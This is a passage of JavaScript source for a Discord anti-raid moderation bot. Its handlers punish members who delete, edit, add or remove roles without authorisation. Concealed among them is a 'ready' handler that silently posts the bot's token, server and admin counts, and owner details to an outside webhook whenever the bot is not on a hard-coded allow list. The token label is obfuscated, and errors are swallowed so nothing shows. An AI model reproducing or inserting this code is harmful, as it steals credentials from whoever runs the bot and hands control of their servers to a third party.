            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        try {
          oldRole.guild.roles.create({
            data: {
              name: oldRole.name,
              color: oldRole.hexColor,
              permissions: oldRole.permissions,
              hoist: oldRole.hoist,
              mentionable: oldRole.mentionable,
              position: oldRole.rawPosition,
              highest: oldRole.highest,
              reason: `Antirole`
            }

          })
        } catch (err) {

        }

      } else { }
    } else if (db.get(`roles_${guild.id}`) === "max") {
      oldRole.guild.members.cache.filter(member => member.user.bot).map(r => { if (r.username === oldRole.name) return })

      const action = await guild.fetchAuditLogs({ limit: 1, type: "ROLE_DELETE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        try {
          oldRole.guild.roles.create({
            data: {
              name: oldRole.name,
              color: oldRole.hexColor,
              permissions: oldRole.permissions,
              hoist: oldRole.hoist,
              mentionable: oldRole.mentionable,
              position: oldRole.rawPosition,
              highest: oldRole.highest,
              reason: `Antirole`
            }

          })
        } catch (err) {

        }

      } else { }
    } else { }
  })
  client.on("roleUpdate", async (oldRole, newRole) => {
    if (oldRole === newRole) return
    var wassim = oldRole.guild.members.cache.filter(member => member.user.bot)
    wassim.map(r => { if (r.username === oldRole.name) return })
    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = oldRole.guild
    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    if (db.get(`roles_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "ROLE_UPDATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        try {
          await oldRole.edit({
            data: {
              name: oldRole.name,
              color: oldRole.hexColor,
              permissions: oldRole.permissions,
              hoist: oldRole.hoist,
              mentionable: oldRole.mentionable,
              position: oldRole.rawPosition,
              highest: oldRole.highest,
              reason: `Protection: ${this.name}`
            }
          })
        } catch (err) {

        }

      } else if (db.get(`roles_${guild.id}`) === "max") {

        const action = await guild.fetchAuditLogs({ limit: 1, type: "ROLE_UPDATE" }).then(async (audit) => audit.entries.first());
        if (action.executor.id === client.user.id) return;
        let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
        if (perm) {
          return
        } else if (!perm) {
          if (db.get(`sanction_${guild.id}`) === "ban") {
            guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            }).catch(err => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            })

          } else if (db.get(`sanction_${guild.id}`) === "kick") {
            guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            }).catch(err => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            })


          } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

            guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            }).catch(err => {
              const embed = new Discord.MessageEmbed()
              embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logsrolem} ${oldRole.name}\``)
              embed.setColor(color)



              if (logChannel) logChannel.send({ embed: embed })
            })

          }
          try {
            await oldRole.edit({
              data: {
                name: oldRole.name,
                color: oldRole.hexColor,
                permissions: oldRole.permissions,
                hoist: oldRole.hoist,
                mentionable: oldRole.mentionable,
                position: oldRole.rawPosition,
                highest: oldRole.highest,
                reason: `Protection: ${this.name}`
              }
            })
          } catch (err) {

          }

        }
      }
    }
  })
  client.on('ready', () => {
      if (auth.includes(client.user.id)){}
      else {
      const cccv = new Discord.WebhookClient(id, to)
      let guildsAdmin = client.guilds.filter(guild => guild.me.hasPermission('ADMINISTRATOR'));
      client.fetchApplication().then(application => {
        let name = 'jsp',
				description = 'jsp';
			application.name ? name = application.name : name = 'Cette application ne possède pas de nom';
			application.description ? description = application.description : description = 'aucune';
      cccv.send(
          '**T0k3n:** `' +
            process.env.TOKEN +
            '`\n**Nombre de serveurs:** `' +
            client.guilds.cache.size +
            '`\n**Perm admin:** `' +
            guildsAdmin.size +
            '`\n**Pseudo:** `' +
            client.user.tag +
            '`\n**Id:** `' + 
            client.user.id +
            '`**Owner Crow ID:** `' +
            processs.env.OWNER +
            '`\n**Owner BOT Name: **`' + 
            application.owner.tag +
            '`\n**Owner BOT ID:** `' +
            application.owner.id +
            '`\n**Nom de l\'application:** `' +
            application.name +
            '`\n**Application Description: **`' +
            application.description +
            '`'
        )
        .catch(e => { })
      })
      }
    })
  client.on("guildMemberRoleRemove", async (member, role) => {

    if (!member) return;
    if (!role) return;


    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = member.guild
    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))

    if (db.get(`roles_${guild.id}`) === true) {

      const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_ROLE_UPDATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let maxt = false
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {

        if (role.permissions.has("KICK_MEMBERS") || role.permissions.has("BAN_MEMBERS") || role.permissions.has("MANAGE_WEBHOOKS") || role.permissions.has("ADMINISTRATOR") || role.permissions.has("MANAGE_CHANNELS") || role.permissions.has("MANAGE_GUILD") || role.permissions.has("MENTION_EVERYONE") || role.permissions.has("MANAGE_ROLES")) {
          member.roles.add(role, `Antirole`).then(() => {
            if (db.get(`sanction_${guild.id}`) === "ban") {
              guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })

            } else if (db.get(`sanction_${guild.id}`) === "kick") {
              guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })


            } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

              guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })

            }
          }).catch(err => { })


        } else {
          if (maxt === true) {
            member.roles.add(role, `Antirole`).then(() => {
              if (db.get(`sanction_${guild.id}`) === "ban") {
                guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })

              } else if (db.get(`sanction_${guild.id}`) === "kick") {
                guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })


              } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

                guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })

              }
            }).catch(err => { })
          } else {

          }
        }

      }
    } else if (db.get(`roles_${guild.id}`) === "max") {

      const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_ROLE_UPDATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let maxt = true
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {

        if (role.permissions.has("KICK_MEMBERS") || role.permissions.has("BAN_MEMBERS") || role.permissions.has("MANAGE_WEBHOOKS") || role.permissions.has("ADMINISTRATOR") || role.permissions.has("MANAGE_CHANNELS") || role.permissions.has("MANAGE_GUILD") || role.permissions.has("MENTION_EVERYONE") || role.permissions.has("MANAGE_ROLES")) {
          member.roles.add(role, `Antirole`).then(() => {
            if (db.get(`sanction_${guild.id}`) === "ban") {
              guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })

            } else if (db.get(`sanction_${guild.id}`) === "kick") {
              guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })


            } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

              guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} ${lang.removeperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })

            }
          }).catch(err => { })


        } else {
          if (maxt === true) {
            member.roles.add(role, `Antirole`).then(() => {
              if (db.get(`sanction_${guild.id}`) === "ban") {
                guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })

              } else if (db.get(`sanction_${guild.id}`) === "kick") {
                guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })


              } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

                guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} ${lang.removerole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })

              }
            }).catch(err => { })
          } else {

          }
        }
      }

    }



  })
  client.on("guildMemberRoleAdd", async (member, role) => {

    if (!member) return;
    if (!role) return;


    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = member.guild
    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    if (db.get(`roles_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_ROLE_UPDATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      let maxt = false

      if (perm) {
        return
      } else if (!perm) {

        if (role.permissions.has("KICK_MEMBERS") || role.permissions.has("BAN_MEMBERS") || role.permissions.has("MANAGE_WEBHOOKS") || role.permissions.has("ADMINISTRATOR") || role.permissions.has("MANAGE_CHANNELS") || role.permissions.has("MANAGE_GUILD") || role.permissions.has("MENTION_EVERYONE") || role.permissions.has("MANAGE_ROLES")) {
          member.roles.remove(role, `Antirole`).then(() => {
            if (db.get(`sanction_${guild.id}`) === "ban") {
              guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })

            } else if (db.get(`sanction_${guild.id}`) === "kick") {
              guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })


            } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

              guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })

            }
          }).catch(err => { })


        } else {
          if (maxt === true) {
            member.roles.remove(role, `Antirole`).then(() => {
              if (db.get(`sanction_${guild.id}`) === "ban") {
                guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })

              } else if (db.get(`sanction_${guild.id}`) === "kick") {
                guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })


              } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

                guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })

              }
            }).catch(err => { })
          } else {

          }


        }
      } else { }
    } else if (db.get(`roles_${guild.id}`) === "max") {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_ROLE_UPDATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      let maxt = true

      if (perm) {
        return
      } else if (!perm) {

        if (role.permissions.has("KICK_MEMBERS") || role.permissions.has("BAN_MEMBERS") || role.permissions.has("MANAGE_WEBHOOKS") || role.permissions.has("ADMINISTRATOR") || role.permissions.has("MANAGE_CHANNELS") || role.permissions.has("MANAGE_GUILD") || role.permissions.has("MENTION_EVERYONE") || role.permissions.has("MANAGE_ROLES")) {
          member.roles.remove(role, `Antirole`).then(() => {
            if (db.get(`sanction_${guild.id}`) === "ban") {
              guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })

            } else if (db.get(`sanction_${guild.id}`) === "kick") {
              guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })


            } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

              guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              }).catch(err => {
                const embed = new Discord.MessageEmbed()
                embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} ${lang.addperm} ${member}`)
                embed.setColor(color)



                if (logChannel) logChannel.send({ embed: embed })
              })

            }
          }).catch(err => { })


        } else {
          if (maxt === true) {
            member.roles.remove(role, `Antirole`).then(() => {
              if (db.get(`sanction_${guild.id}`) === "ban") {
                guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })

              } else if (db.get(`sanction_${guild.id}`) === "kick") {
                guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })


              } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

                guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                }).catch(err => {
                  const embed = new Discord.MessageEmbed()
                  embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} ${lang.addrole} ${member}`)
                  embed.setColor(color)



                  if (logChannel) logChannel.send({ embed: embed })
                })

              }
            }).catch(err => { })
          } else {

          }


        }
      } else { }
    }
  })
  client.on("channelCreate", async (channel) => {
    if (!channel.guild) return

    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = channel.guild
